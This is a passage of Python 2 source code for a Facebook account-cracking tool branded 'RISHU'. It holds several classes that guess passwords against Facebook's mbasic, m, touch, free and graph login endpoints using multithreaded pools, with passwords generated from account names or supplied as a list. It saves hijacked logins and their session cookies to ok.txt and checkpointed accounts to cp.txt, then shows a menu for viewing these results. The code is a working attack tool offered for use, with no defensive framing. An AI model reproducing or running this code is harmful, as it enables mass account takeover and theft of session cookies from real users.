                        except Exception as e:
                            print '   %s' % e
                            continue

                    self.fl = []
                    for i in self.fs:
                        try:
                            self.fl.append({'id': i.split('<=>')[0], 'pw': generate(i.split('<=>')[1])})
                        except:
                            continue

                except Exception as e:
                    print '   %s' % e
                    continue
                print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;32m] Account [OK] saved to : mbasic/ok.txt'
                print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;31m] Account [CP] saved to : mbasic/cp.txt'
                ThreadPool(35).map(self.main, self.fl)
                os.remove(self.apk)
                print '\n\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;31m] Done Ya Anjing'
                break

    def pwlist(self):
        self.pw = raw_input('\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;32m] Password List: ').split(',')
        if len(self.pw) == 0:
            self.pwlist()
        else:
            for i in self.fl:
                i.update({'pw': self.pw})
            print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;32m] Account [OK] saved to : mbasic/ok.txt'
            print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;31m] Account [CP] saved to : mbasic/cp.txt'
            ThreadPool(30).map(self.main, self.fl)
            os.remove(self.apk)
            print '\n\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;31m] Done Ya Anjing'

    def main(self, fl):
        try:
            for i in fl.get('pw'):
                log = mbasic(fl.get('id'), i, 'https://mbasic.facebook.com')
                if log.get('status') == 'success':
                    print '\r \x1b[1;32m[RISHU-OK]%s %s \xe2\x80\xa2 %s %s      \x1b[1;37m' % (G, fl.get('id'), i, N)
                    self.ada.append('%s|%s' % (fl.get('id'), i))
                    if fl.get('id') in open('ok.txt').read():
                        break
                    else:
                        open('mbasic/ok.txt', 'a+').write('%s|%s|%s\n\n' % (fl.get('id'), i, gets_cookies(log.get('cookies'))))
                    ko = '%s|%s|%s\n\n' % (fl.get('id'), i, gets_cookies(log.get('cookies')))
                    break
                elif log.get('status') == 'cp':
                    print '\r\x1b[1;31m [RISHU-CP]%s %s \xe2\x80\xa2 %s %s      \x1b[1;37m' % (O, fl.get('id'), i, N)
                    self.cp.append('%s|%s' % (fl.get('id'), i))
                    open('mbasic/cp.txt', 'a+').write('%s|%s|\n' % (fl.get('id'), i))
                    break
                else:
                    continue

            self.ko += 1
            print '\r [Crack] %s/%s - Ok-:%s - Cp-:%s' % (self.ko, len(self.fl), len(self.ada), len(self.cp)),
            sys.stdout.flush()
        except:
            self.main(fl)


class crack1:
    print ''
    def __init__(self,isifile):
        self.ada = []
        self.cp = []
        self.ko = 0
        print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;32m] Crack With Pass Default Or Manual [d/m]'
        while True:
            f = raw_input('\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;31m] Choose: ')
            if f == '':
                continue
            elif f == 'm':
                try:
                    while True:
                        try:
                            self.apk = isifile
                            self.fs = open(self.apk).read().splitlines()
                            break
                        except Exception as e:
                            print '   %s' % e
                            continue

                    self.fl = []
                    for i in self.fs:
                        try:
                            self.fl.append({'id': i.split('<=>')[0]})
                        except:
                            continue

                except Exception as e:
                    print '%s' % e
                    continue

                print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;32m] Example : pass123,pass12345'
                self.pwlist()
                break
            elif f == 'd':
                try:
                    while True:
                        try:
                            self.apk = isifile
                            self.fs = open(self.apk).read().splitlines()
                            break
                        except Exception as e:
                            print '   %s' % e
                            continue

                    self.fl = []
                    for i in self.fs:
                        try:
                            self.fl.append({'id': i.split('<=>')[0], 'pw': generate(i.split('<=>')[1])})
                        except:
                            continue

                except Exception as e:
                    print '   %s' % e
                    continue

                print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;32m] Account [OK] saved to : mfb/ok.txt'
                print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;31m] Account [CP] saved to : mfb/cp.txt'
                ThreadPool(35).map(self.main, self.fl)
                os.remove(self.apk)
                print '\n\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;32m] Done Ya Anjing'
                break

    def pwlist(self):
        self.pw = raw_input('\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;31m] Password List: ').split(',')
        if len(self.pw) == 0:
            self.pwlist()
        else:
            for i in self.fl:
                i.update({'pw': self.pw})

            print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;32m] Account [OK] saved to : mfb/ok.txt'
            print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;31m] Account [CP] saved to : mfb/cp.txt'
            ThreadPool(30).map(self.main, self.fl)
            os.remove(self.apk)
            print '\n\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;32m] Done Ya Anjing'

    def main(self, fl):
        try:
            for i in fl.get('pw'):
                log = m_fb(fl.get('id'), i, 'https://m.facebook.com')
                if log.get('status') == 'success':
                    print '\r \x1b[1;32m[RISHU-OK]%s %s \xe2\x80\xa2 %s %s      \x1b[1;37m' % (G, fl.get('id'), i, N)
                    self.ada.append('%s|%s' % (fl.get('id'), i))
                    if fl.get('id') in open('ok.txt').read():
                        break
                    else:
                        open('mfb/ok.txt', 'a+').write('%s|%s|%s\n\n' % (fl.get('id'), i, gets_cookies(log.get('cookies'))))
                    ko = '%s|%s|%s\n\n' % (fl.get('id'), i, gets_cookies(log.get('cookies')))
                    break
                elif log.get('status') == 'cp':
                    print '\r \x1b[1;31m[RISHU-CP]%s %s \xe2\x80\xa2 %s %s      \x1b[1;37m' % (O, fl.get('id'), i, N)
                    self.cp.append('%s|%s' % (fl.get('id'), i))
                    open('mfb/cp.txt', 'a+').write('%s|%s|\n' % (fl.get('id'), i))
                    break
                else:
                    continue

            self.ko += 1
            print '\r [Crack] %s/%s - Ok-:%s - Cp-:%s' % (self.ko, len(self.fl), len(self.ada), len(self.cp)),
            sys.stdout.flush()
        except:
            self.main(fl)


class crack2:
    print ''
    def __init__(self,isifile):
        self.ada = []
        self.cp = []
        self.ko = 0
        print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;32m] Crack With Pass Default Or Manual [d/m]'
        while True:
            f = raw_input('\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;31m] Choose: ')
            if f == '':
                continue
            elif f == 'm':
                try:
                    while True:
                        try:
                            self.apk=isifile
                            self.fs=open(self.apk).read().splitlines()
                            break
                        except Exception as e:
                            print '   %s' % e
                            continue

                    self.fl = []
                    for i in self.fs:
                        try:
                            self.fl.append({'id': i.split('<=>')[0]})
                        except:
                            continue

                except Exception as e:
                    print '%s' % e
                    continue

                print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;32m] Example : pass123,pass12345'
                self.pwlist()
                break
            elif f == 'd':
                try:
                    while True:
                        try:
                            self.apk = isifile
                            self.fs = open(self.apk).read().splitlines()
                            break
                        except Exception as e:
                            print '   %s' % e
                            continue

                    self.fl = []
                    for i in self.fs:
                        try:
                            self.fl.append({'id': i.split('<=>')[0], 'pw': generate(i.split('<=>')[1])})
                        except:
                            continue

                except Exception as e:
                    print '   %s' % e
                    continue

                print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;32m] Account [OK] saved to : touchfb/ok.txt'
                print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;31m] Account [CP] saved to : touchfb/cp.txt'
                ThreadPool(35).map(self.main, self.fl)
                os.remove(self.apk)
                print '\n\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;32m] Done Ya Anjing'
                break

    def pwlist(self):
        self.pw = raw_input('\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;31m] Password List: ').split(',')
        if len(self.pw) == 0:
            self.pwlist()
        else:
            for i in self.fl:
                i.update({'pw': self.pw})

            print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;32m] Account [OK] saved to : touchfb/ok.txt'
            print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;31m] Account [CP] saved to : touchfb/cp.txt'
            ThreadPool(30).map(self.main, self.fl)
            os.remove(self.apk)
            print '\n\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;31m] Done Ya Anjing'

    def main(self, fl):
        try:
            for i in fl.get('pw'):
                log = touch_fb(fl.get('id'), i, 'https://touch.facebook.com')
                if log.get('status') == 'success':
                    print '\r \x1b[1;32m[RISHU-OK]%s %s \xe2\x80\xa2 %s %s      \x1b[1;37m' % (G, fl.get('id'), i, N)
                    self.ada.append('%s|%s' % (fl.get('id'), i))
                    if fl.get('id') in open('ok.txt').read():
                        break
                    else:
                        open('touchfb/ok.txt', 'a+').write('%s|%s|%s\n\n' % (fl.get('id'), i, gets_cookies(log.get('cookies'))))
                    ko = '%s|%s|%s\n\n' % (fl.get('id'), i, gets_cookies(log.get('cookies')))
                    break
                elif log.get('status') == 'cp':
                    print '\r \x1b[1;31m[RISHU-CP]%s %s \xe2\x80\xa2 %s %s      \x1b[1;37m' % (O, fl.get('id'), i, N)
                    self.cp.append('%s|%s' % (fl.get('id'), i))
                    open('touchfb/cp.txt', 'a+').write('%s|%s|\n' % (fl.get('id'), i))
                    break
                else:
                    continue

            self.ko += 1
            print '\r [Crack] %s/%s - Ok-:%s - Cp-:%s' % (self.ko, len(self.fl), len(self.ada), len(self.cp)),
            sys.stdout.flush()
        except:
            self.main(fl)

class freefb:
    print ''
    def __init__(self,isifile):
        self.ada = []
        self.cp = []
        self.ko = 0
        print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;32m] Crack With Pass Default Or Manual [d/m]'
        while True:
            f = raw_input('\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;31m] Choose: ')
            if f == '':
                continue
            elif f == 'm':
                try:
                    while True:
                        try:
                            self.apk = isifile
                            self.fs = open(self.apk).read().splitlines()
                            break
                        except Exception as e:
                            print '   %s' % e
                            continue

                    self.fl = []
                    for i in self.fs:
                        try:
                            self.fl.append({'id': i.split('<=>')[0]})
                        except:
                            continue

                except Exception as e:
                    print '%s' % e
                    continue

                print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;32m] Example : pass123,pass12345'
                self.pwlist()
                break
            elif f == 'd':
                try:
                    while True:
                        try:
                            self.apk = isifile
                            self.fs = open(self.apk).read().splitlines()
                            break
                        except Exception as e:
                            print '   %s' % e
                            continue

                    self.fl = []
                    for i in self.fs:
                        try:
                            self.fl.append({'id': i.split('<=>')[0], 'pw': generate(i.split('<=>')[1])})
                        except:
                            continue

                except Exception as e:
                    print '   %s' % e
                    continue

                print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;32m] Account [OK] saved to : freefb/ok.txt'
                print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;31m] Account [CP] saved to : freefb/cp.txt'
                ThreadPool(35).map(self.main, self.fl)
                os.remove(self.apk)
                print '\n\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;31m] Done Ya Anjing'
                break

    def pwlist(self):
        self.pw = raw_input('\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Password List: ').split(',')
        if len(self.pw) == 0:
            self.pwlist()
        else:
            for i in self.fl:
                i.update({'pw': self.pw})

            print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;32m] Account [OK] saved to : freefb/ok.txt'
            print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;31m] Account [CP] saved to : freefb/cp.txt'
            ThreadPool(30).map(self.main, self.fl)
            os.remove(self.apk)
            print '\n\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;31m] Done Ya Anjing'

    def main(self, fl):
        try:
            for i in fl.get('pw'):
                log = f_fb(fl.get('id'), i, 'https://free.facebook.com')
                if log.get('status') == 'success':
                    print '\r \x1b[1;32m[RISHU-OK]%s %s \xe2\x80\xa2 %s %s      \x1b[1;37m' % (G, fl.get('id'), i, N)
                    self.ada.append('%s|%s' % (fl.get('id'), i))
                    if fl.get('id') in open('ok.txt').read():
                        break
                    else:
                        open('freefb/ok.txt', 'a+').write('%s|%s|%s\n\n' % (fl.get('id'), i, gets_cookies(log.get('cookies'))))
                    ko = '%s|%s|%s\n\n' % (fl.get('id'), i, gets_cookies(log.get('cookies')))
                    break
                elif log.get('status') == 'cp':
                    print '\r\x1b[1;31m [RISHU-CP]%s %s \xe2\x80\xa2 %s %s      \x1b[1;37m' % (O, fl.get('id'), i, N)
                    self.cp.append('%s|%s' % (fl.get('id'), i))
                    open('freefb/cp.txt', 'a+').write('%s|%s|\n' % (fl.get('id'), i))
                    break
                else:
                    continue

            self.ko += 1
            print '\r [Crack] %s/%s - Ok-:%s - Cp-:%s' % (self.ko, len(self.fl), len(self.ada), len(self.cp)),
            sys.stdout.flush()
        except:
            self.main(fl)

class crack3:
    print ''
    def __init__(self,isifile):
        self.ada = []
        self.cp = []
        self.ko = 0
        print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;32m] Crack With Pass Default Or Manual [d/m]'
        while True:
            f = raw_input('\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;31m] Choose: ')
            if f == '':
                continue
            elif f == 'm':
                try:
                    while True:
                        try:
                            self.apk = isifile
                            self.fs = open(self.apk).read().splitlines()
                            break
                        except Exception as e:
                            print '   %s' % e
                            continue

                    self.fl = []
                    for i in self.fs:
                        try:
                            self.fl.append({'id': i.split('<=>')[0]})
                        except:
                            continue

                except Exception as e:
                    print '%s' % e
                    continue

                print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;32m] Example : pass123,pass12345'
                self.pwlist()
                break
            elif f == 'd':
                try:
                    while True:
                        try:
                            self.apk = isifile
                            self.fs = open(self.apk).read().splitlines()
                            break
                        except Exception as e:
                            print '   %s' % e
                            continue

                    self.fl = []
                    for i in self.fs:
                        try:
                            self.fl.append({'id': i.split('<=>')[0], 'pw': generate(i.split('<=>')[1])})
                        except:
                            continue

                except Exception as e:
                    print '   %s' % e
                    continue

                print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;32m] Account [OK] saved to : apifb/ok.txt'
                print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;31m] Account [CP] saved to : apifb/cp.txt'
                ThreadPool(35).map(self.main, self.fl)
                os.remove(self.apk)
                print '\n\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;31m] Done Ya Anjing'
                break

    def pwlist(self):
        self.pw = raw_input('\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Password List: ').split(',')
        if len(self.pw) == 0:
            self.pwlist()
        else:
            for i in self.fl:
                i.update({'pw': self.pw})

            print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;32m] Account [OK] saved to : apifb/ok.txt'
            print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;31m] Account [CP] saved to : apifb/cp.txt'
            ThreadPool(30).map(self.main, self.fl)
            os.remove(self.apk)
            print '\n\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;31m] Done Ya Anjing'

    def main(self, fl):
        try:
            for i in fl.get('pw'):
                log = graph_fb(fl.get('id'), i, 'https://graph.facebook.com')
                if log.get('status') == 'success':
                    print '\r \x1b[1;32m[RISHU-OK]%s %s \xe2\x80\xa2 %s %s      \x1b[1;37m' % (G, fl.get('id'), i, N)
                    self.ada.append('%s|%s' % (fl.get('id'), i))
                    if fl.get('id') in open('ok.txt').read():
                        break
                    else:
                        open('apifb/ok.txt', 'a+').write('%s|%s|%s\n\n' % (fl.get('id'), i, gets_cookies(log.get('cookies'))))
                    ko = '%s|%s|%s\n\n' % (fl.get('id'), i, gets_cookies(log.get('cookies')))
                    break
                elif log.get('status') == 'cp':
                    print '\r\x1b[1;31m [RISHU-CP]%s %s \xe2\x80\xa2 %s %s      \x1b[1;37m' % (O, fl.get('id'), i, N)
                    self.cp.append('%s|%s' % (fl.get('id'), i))
                    open('apifb/cp.txt', 'a+').write('%s|%s|\n' % (fl.get('id'), i))
                    break
                else:
                    continue

            self.ko += 1
            print '\r [Crack] %s/%s - Ok-:%s - Cp-:%s' % (self.ko, len(self.fl), len(self.ada), len(self.cp)),
            sys.stdout.flush()
        except:
            self.main(fl)

### Result Hasill ####



def results(kntl,zecheed):
        if len(kntl) !=0:
                print(("\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] "+str(len(kntl))))
        if len(zecheed) !=0:
                print(("\033[0;96m\033[0;97m [\033[1;36m•\033[1;31m] CP: "+str(len(zecheed))))
        if len(kntl) ==0 and len(zecheed) ==0:
                print("\n")
                print(("\033[0;96m\033[0;97m [\033[1;36m•\033[1;31m] No Result Found"))

### Pilih Result ###
def ress():
    os.system('clear')
    print logo
    print("\033[0;96m"+50*"-")
    print("\033[0;96m\033[0;97m [\033[1;36m•\033[1;32m] RESULT CRACKER")
    print("\033[0;96m"+50*"-")
    print("\033[0;96m\033[0;97m [\033[1;31m[1]\033[1;32m] Cek Result Crack Mbasic.Facebook") 
    print("\033[0;96m\033[0;97m [\033[1;31m[2]\033[1;32m] Cek Result Crack M.Facebook") 
    print("\033[0;96m\033[0;97m [\033[1;31m[3]\033[1;32m] Cek Result Crack Touch.Facebook")
    print("\033[0;96m\033[0;97m [\033[1;31m[4]\033[1;32m] Cek Result Crack Api.Facebook")
    print("\033[0;96m\033[0;97m [\033[1;31m[5]\033[1;32m] Cek Result Crack Free.Facebook")
    print("\033[0;96m\033[0;97m [\033[1;31m[0]\033[1;32m] Back To Menu")
    pill = raw_input('\n\033[0;96m\033[0;97m [\033[1;36m•\033[1;31m] Choose: ')
    if pill =="1" or pill =="01":
        result_mbasicc()
    elif pill =="2" or pill =="02":
        result_emefbi()
    elif pill =="3" or pill =="03":
        result_touchh()
    elif pill =="4" or pill =="04":
        result_apei()
    elif pill =="5" or pill =="05":
        result_freeefbi()
    elif pill =="0" or pill =="00":
        menu()
    else:
        print('\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;31m] Wrong Keyword!').format(R, N)
        ress()

### Result ###

def result_mbasicc():
    os.system('clear')
    print logo
    print("\033[0;96m"+50*"-")
    print(("\033[0;96m\033[0;97m [\033[1;36m•\033[1;32m] Result Cracker Mbasic\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m]"))
    print("\033[0;96m"+50*"-")
    print(("\033[0;96m\033[0;97m [\033[1;36m•\033[1;32m] Result OK "))
    try:
        os.system("cat mbasic/ok.txt")
    except IOError:
        print(("\033[0;96m\033[0;97m [\033[1;36m•\033[1;31m] No Result Found"))
    print(("\n\033[0;96m\033[0;97m [\033[1;36m•\033[1;31m] Result CP"))
    try:
        os.system("cat mbasic/cp.txt")
    except IOError:
        print(("\033[0;96m\033[0;97m [\033[1;36m•\033[1;31m] No Result Found"))
    n = raw_input("\033[1;32m [BACK]")
    menu()

def result_emefbi():
    os.system('clear')
    print logo
    print("\033[0;96m"+50*"-")
    print(("\033[0;96m\033[0;97m [\033[1;36m•\033[1;32m] Result Cracker M.Facebook\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m]"))
    print("\033[0;96m"+50*"-")
    print(("\033[0;96m\033[0;97m [\033[1;36m•\033[1;32m] Result OK "))
    try:
        os.system("cat mfb/ok.txt")
    except IOError:
        print(("\033[0;96m\033[0;97m [\033[1;36m•\033[1;31m] No Result Found"))
    print(("\n\033[0;96m\033[0;97m [\033[1;36m•\033[1;31m] Result CP"))
    try:
        os.system("cat mfb/cp.txt")
    except IOError:
        print(("\033[0;96m\033[0;97m [\033[1;36m•\033[1;31m] No Result Found"))
    n = raw_input("\033[1;32m [BACK]")
    menu()

def result_touchh():
    os.system('clear')
    print logo 
    print("\033[0;96m"+50*"-")
    print(("\033[0;96m\033[0;97m [\033[1;36m•\033[1;32m] Result Cracker Touch.Facebook\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m]"))
    print("\033[0;96m"+50*"-")
    print(("\033[0;96m\033[0;97m [\033[1;36m•\033[1;32m] Result OK "))
    try:
        os.system("cat touchfb/ok.txt")
    except IOError:
        print(("\033[0;96m\033[0;97m [\033[1;36m•\033[1;31m] No Result Found"))
    print(("\n\033[0;96m\033[0;97m [\033[1;36m•\033[1;31m] Result CP"))
    try:
        os.system("cat touchfb/cp.txt")
    except IOError:
        print(("\033[0;96m\033[0;97m [\033[1;36m•\033[1;31m] No Result Found"))
    n = raw_input("\033[1;32m [BACK]")
    menu()

def result_apei():
    os.system('clear')
    print logo
    print("\033[0;96m"+50*"-")
    print(("\033[0;96m\033[0;97m [\033[1;36m•\033[1;32m] Result Cracker Api.Facebook\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m]"))
    print("\033[0;96m"+50*"-")
    print(("\033[0;96m\033[0;97m [\033[1;36m•\033[1;32m] Result OK "))
    try:
        os.system("cat apifb/ok.txt")
    except IOError:
        print(("\033[0;96m\033[0;97m [\033[1;36m•\033[1;31m] No Result Found"))
    print(("\n\033[0;96m\033[0;97m [\033[1;36m•\033[1;31m] Result CP"))
    try:
        os.system("cat apifb/cp.txt")
    except IOError:
        print(("\033[0;96m\033[0;97m [\033[1;36m•\033[1;31m] No Result Found"))
    n = raw_input("\033[1;32m [BACK]")
    menu()

def result_freeefbi():
    os.system('clear')
    print logo 
    print("\033[0;96m"+50*"-")
    print(("\033[0;96m\033[0;97m [\033[1;36m•\033[1;32m] Result Cracker Free.Facebook\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m]"))
    print("\033[0;96m"+50*"-")
    print(("\033[0;96m\033[0;97m [\033[1;36m•\033[1;32m] Result OK "))
    try:
        os.system("cat freefb/ok.txt")
    except IOError:
        print(("\033[0;96m\033[0;97m [\033[1;36m•\033[1;31m] No Result Found"))
    print(("\n\033[0;96m\033[0;97m [\033[1;36m•\033[1;31m] Result CP"))
    try:
        os.system("cat freefb/cp.txt")
    except IOError:
        print(("\033[0;96m\033[0;97m [\033[1;36m•\033[1;31m] No Result Found"))
    n = raw_input("\033[1;32m [BACK]")
    menu()


if __name__=="__main__":
    menu()